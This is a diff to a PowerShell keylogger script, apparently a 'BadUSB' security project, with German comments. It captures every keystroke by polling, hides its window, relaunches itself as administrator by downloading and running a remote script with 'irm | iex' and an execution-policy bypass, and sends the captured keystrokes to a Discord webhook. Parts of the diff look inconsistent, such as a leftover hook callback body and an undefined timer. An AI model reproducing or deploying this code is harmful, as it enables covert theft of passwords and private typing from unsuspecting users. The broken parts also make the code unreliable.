@@ -1,6 +1,6 @@
 # PowerShell Keylogger & Discord-Webhook-Sender mit Timeout (robuster für deutsches Layout)
 
-# Erzwinge STA-Thread für Forms und Hooks
+# Erzwinge STA-Thread für Forms
 [System.Threading.Thread]::CurrentThread.ApartmentState = 'STA'
 
 # Prüfe, ob als Administrator läuft
@@ -11,41 +11,24 @@ function Test-Admin {
 }
 
 if (-not (Test-Admin)) {
-    # Starte als Administrator neu
-    $scriptPath = $MyInvocation.MyCommand.Path
-    $arguments = "-ExecutionPolicy Bypass -File `"$scriptPath`""
-    Start-Process powershell -ArgumentList $arguments -Verb RunAs -Wait
+    # Starte als Administrator neu mit dem gleichen One-Liner
+    $command = "powershell -w h -NoP -Ep Bypass `"irm https://raw.githubusercontent.com/JustusKapst/it-security_projekt1/5b5b359d713fbd06c6f302190fd3e2209c289258/logger.ps1 | iex`""
+    Start-Process powershell -ArgumentList $command -Verb RunAs -Wait
     exit
 }
 
-Add-Type -AssemblyName System.Windows.Forms
 Add-Type -TypeDefinition @"
 using System;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Diagnostics;
 using System.IO;
+using System.Collections.Generic;
 
-public class KeyLogger
+public static class KeyLogger
 {
-    private const int WH_KEYBOARD_LL = 13;
-    private const int WM_KEYDOWN = 0x0100;
-    private const int WM_KEYUP = 0x0101;
-    private const int WM_SYSKEYDOWN = 0x0104;
-    private const int WM_SYSKEYUP = 0x0105;
-
-    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
-
-    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-    [return: MarshalAs(UnmanagedType.Bool)]
-    private static extern bool UnhookWindowsHookEx(IntPtr hhk);
-
-    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
-
-    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-    private static extern IntPtr GetModuleHandle(string lpModuleName);
+    [DllImport("user32.dll")]
+    private static extern short GetAsyncKeyState(int vKey);
 
     [DllImport("user32.dll")]
     private static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);
@@ -56,38 +39,44 @@ public class KeyLogger
     [DllImport("user32.dll")]
     private static extern bool GetKeyboardState(byte[] lpKeyState);
 
-    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
+    private static StringBuilder _buffer = new StringBuilder();
+    private static DateTime _lastSend = DateTime.Now;
+    private static string _hookUrl;
+    private static string _logFile = "badusb_logger.txt";
+    private static Dictionary<int, bool> _keyStates = new Dictionary<int, bool>();
 
-        private static LowLevelKeyboardProc _proc;
-    private IntPtr _hookID = IntPtr.Zero;
-    private StringBuilder _buffer = new StringBuilder();
-    private DateTime _lastSend = DateTime.Now;
-    private string _hookUrl;
-    private string _logFile = "badusb_logger.txt";
-
-    public KeyLogger(string hookUrl)
+    public static void Initialize(string hookUrl)
     {
         _hookUrl = hookUrl;
-        _proc = HookCallback;
-        _hookID = SetHook(_proc);
-        LogToFile("Hook gesetzt: " + (_hookID != IntPtr.Zero ? "Erfolgreich" : "Fehlgeschlagen"));
+        LogToFile("KeyLogger initialisiert");
     }
 
-    private IntPtr SetHook(LowLevelKeyboardProc proc)
+    public static void CheckKeys()
     {
-        using (Process curProcess = Process.GetCurrentProcess())
-        using (ProcessModule curModule = curProcess.MainModule)
+        for (int vk = 0x01; vk <= 0xFE; vk++)
         {
-            return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
+            short state = GetAsyncKeyState(vk);
+            bool isPressed = (state & 0x8000) != 0;
+            bool wasPressed = _keyStates.ContainsKey(vk) && _keyStates[vk];
+
+            if (isPressed && !wasPressed)
+            {
+                // Taste wurde gerade gedrückt
+                string key = GetKeyString(vk);
+                _buffer.Append(key);
+                LogToFile("Taste erfasst: " + key);
+            }
+
+            _keyStates[vk] = isPressed;
         }
     }
 
-    private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
     {
+        LogToFile("HookCallback aufgerufen");
         if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN))
         {
             int vkCode = Marshal.ReadInt32(lParam);
-                        uint scanCode = (uint)Marshal.ReadInt32(lParam, 4);
+            uint scanCode = (uint)Marshal.ReadInt32(lParam, 4);
 
             byte[] keyState = new byte[256];
             GetKeyboardState(keyState);
@@ -140,33 +129,42 @@ public class KeyLogger
         return CallNextHookEx(_hookID, nCode, wParam, lParam);
     }
 
-    public void SendBuffer()
+    public static void SendBuffer()
     {
-        if (_buffer.Length > 0)
+        while (_buffer.Length > 0)
         {
+            string content = _buffer.ToString();
+            if (content.Length > 1900)
+            {
+                content = content.Substring(0, 1900);
+                _buffer.Remove(0, 1900);
+            }
+            else
+            {
+                _buffer.Clear();
+            }
             try
             {
                 using (var client = new System.Net.WebClient())
                 {
                     client.Headers.Add("Content-Type", "application/json");
-                    string payload = $"{{\"content\":\"{_buffer.ToString().Replace("\"", "\\\"")}\"}}";
+                    string payload = $"{{\"content\":\"{content.Replace("\"", "\\\"")}\"}}";
                     client.UploadString(_hookUrl, "POST", payload);
                 }
-                LogToFile("Buffer gesendet: " + _buffer.ToString());
-                _buffer.Clear();
+                LogToFile("Buffer gesendet: " + content);
                 _lastSend = DateTime.Now;
             }
-                        catch (Exception ex) { LogToFile("SendBuffer Exception: " + ex.ToString()); }
+            catch (Exception ex) { LogToFile("SendBuffer Exception: " + ex.ToString()); }
         }
     }
 
-    public void Unhook()
+    public static void Unhook()
     {
         UnhookWindowsHookEx(_hookID);
         LogToFile("Hook entfernt");
     }
 
-    private void LogToFile(string message)
+    private static void LogToFile(string message)
     {
         try
         {
@@ -184,7 +182,7 @@ try {
     Invoke-RestMethod -Uri $hookUrl -Method Post -Body (@{content="[Logger] gestartet: $(Get-Date -Format o)"}|ConvertTo-Json) -ContentType "application/json"
 } catch {}
 
-$logger = New-Object KeyLogger $hookUrl
+[KeyLogger]::Initialize($hookUrl)
 $start = Get-Date
 $timeout = 120 # Sekunden
 
@@ -198,7 +196,7 @@ $sendTimer.AutoReset = $true
 $sendTimer.add_Elapsed({
     [System.Threading.Monitor]::Enter($sendBufferLock)
     try {
-        $logger.SendBuffer()
+        [KeyLogger]::SendBuffer()
     } finally {
         [System.Threading.Monitor]::Exit($sendBufferLock)
     }
@@ -218,18 +216,23 @@ $timeoutTimer.Start()
 $form = New-Object System.Windows.Forms.Form
 $form.ShowInTaskbar = $false
 $form.WindowState = 'Minimized'
-$form.Visible = $false
+$form.Opacity = 0
+$form.Visible = $true
 
 # Message-Loop für Hook
 [System.Windows.Forms.Application]::Run($form)
 
 # Nach Timeout stoppen
+$checkTimer.Stop()
 $sendTimer.Stop()
 $timeoutTimer.Stop()
-$logger.SendBuffer()  # Rest senden
-$logger.Unhook()
+[KeyLogger]::SendBuffer()  # Rest senden
 
 # Logger-Ende an Discord melden
+LogToFile("Logger beendet, sende Nachricht an Discord")
 try {
     Invoke-RestMethod -Uri $hookUrl -Method Post -Body (@{content="[Logger] beendet: $(Get-Date -Format o)"}|ConvertTo-Json) -ContentType "application/json"
-} catch {}
+    LogToFile("Beendigungs-Nachricht erfolgreich gesendet")
+} catch {
+    LogToFile("Fehler beim Senden der Beendigungs-Nachricht: " + $_.Exception.Message)
+}
